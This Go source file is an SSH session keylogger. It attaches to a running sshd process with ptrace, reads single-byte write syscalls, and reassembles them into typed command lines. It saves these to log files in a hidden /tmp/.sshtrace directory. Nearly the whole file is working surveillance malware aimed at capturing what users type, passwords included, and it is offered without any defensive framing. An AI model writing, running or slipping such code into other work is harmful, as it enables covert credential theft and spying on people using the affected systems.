package main

import (
	"errors"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	sys "golang.org/x/sys/unix"
)

var (
	pid = flag.Int("p", -1, "process id")

	DIR = "/tmp/.sshtrace"

	uniqProcs sync.Map
)

func main() {
	stopCh := make(chan struct{})
	handleSignal(stopCh)
	flag.Parse()

	if err := os.MkdirAll(DIR, os.ModePerm); err != nil {
		log.Fatal(err)
	}

	p := Process{
		ID:  *pid,
		Arg: "TODO",
	}
	procs := []Process{p}

	var wg sync.WaitGroup
	for {
		for _, p := range procs {
			if p.ID == os.Getpid() || p.ID == os.Getppid() {
				continue
			}
			if _, ok := uniqProcs.Load(p.ID); ok {
				continue
			}
			uniqProcs.Store(p.ID, true)
			wg.Add(1)
			go func(p Process) {
				keyloggerSshd(stopCh, p)
				uniqProcs.Delete(p.ID)
				wg.Done()
			}(p)
		}

		select {
		case <-stopCh:
			wg.Wait()
			log.Print("exit")
			os.Exit(1)
		case <-time.After(5 * time.Second):
		}
	}
}

func detach(p Process) {
	if err := sys.PtraceDetach(p.ID); err != nil {
		log.Printf("Failed to detach: pid: %d, %s", p.ID, err)
		return
	}
	log.Print("detach success")
}

func keyloggerSshd(stopCh chan struct{}, p Process) {
	arg := strings.Split(p.Arg, "@")
	filename := fmt.Sprintf("%s_%d_sshd.log", arg[0], p.ID)
	filepath := filepath.Join(DIR, filename)
	log.Printf("Logging sshd, pid: %d", p.ID)
	file, err := os.OpenFile(filepath, os.O_WRONLY|os.O_CREATE, 0666)
	if err != nil {
		fmt.Print(err)
		return
	}
	defer file.Close()

	fmt.Println(filename)
	err = sys.PtraceAttach(p.ID)
	if err != nil {
		log.Printf("Failed to attach: %s", err)
		return
	}
	log.Print("attach success")
	defer detach(p)

	if err = sys.PtraceSetOptions(p.ID, syscall.PTRACE_O_TRACESYSGOOD); err != nil {
		log.Printf("Failed to set options: %s", err)
		return
	}

	var prevOrigRax uint64
	var command string
	for {
		select {
		case <-stopCh:
			return
		default:
		}

		var s sys.WaitStatus
		if _, err = sys.Wait4(p.ID, &s, 0, nil); err != nil {
			log.Printf("Failed to wait: %s", err)
		}

		if s.Exited() {
			log.Print("Process exited :%d", p.ID)
			return
		} else if s.Stopped() {
			var regs sys.PtraceRegs
			sys.PtraceGetRegs(p.ID, &regs)
			if regs.Orig_rax != prevOrigRax {
				value := peek(p.ID, regs.Orig_rax, regs.Rsi, regs.Rdx)
				if len(value) != 0 {
					if value == "\t" {
						command += "\t"
					} else if value == "\r" || value == "\n" {
						fmt.Println(command)
						if _, err = file.WriteString(command); err != nil {
							log.Print(err)
							return
						}
						command = ""
					} else {
						command += value
					}
				}
			}
			prevOrigRax = regs.Orig_rax

		}

		if err = sys.PtraceSyscall(p.ID, 0); err != nil {
			log.Printf("Failed to PtraceSyscall: %s", err)
			return
		}

	}

	if err = sys.PtraceDetach(p.ID); err != nil {
		log.Fatal(err)
		return
	}
}

func peek(pid int, call, addr, count uint64) string {
	var value []byte
	if call == syscall.SYS_WRITE {
		if count != 1 {
			return ""
		}
		var i uint64
		for i = 0; i < count; i++ {
			b := make([]byte, 1)
			_, err := sys.PtracePeekData(pid, uintptr(addr+i), b)
			if err != nil {
				fmt.Println(err)
			}
			value = append(value, b...)
		}
	}
	return string(value)
}

type Process struct {
	ID  int
	Arg string
}

func sshd() (procs []Process, err error) {
	out, err := exec.Command("ps", "auxw").Output()
	if err != nil {
		errors.New("Command Exec Error.")
	}
	for _, line := range strings.Split(string(out), "\n") {
		if !strings.Contains(line, "ssh") {
			continue
		}

		fields := strings.Fields(line)
		if len(fields) < 12 || !strings.Contains(fields[11], "pts") {
			continue
		}
		fmt.Println(fields[11])
		if pid, err := strconv.Atoi(fields[1]); err == nil {
			p := Process{
				ID:  pid,
				Arg: fields[11],
			}
			procs = append(procs, p)
		}

	}
	return procs, nil

}

func handleSignal(stopCh chan struct{}) {
	signal_chan := make(chan os.Signal, 1)
	signal.Notify(signal_chan, syscall.SIGINT)

	go func() {
		for {
			s := <-signal_chan
			switch s {
			case syscall.SIGINT:
				log.Print("Recieve SIGINT")
				close(stopCh)
			default:
				fmt.Println("Unknown signal")
			}
		}
	}()
}
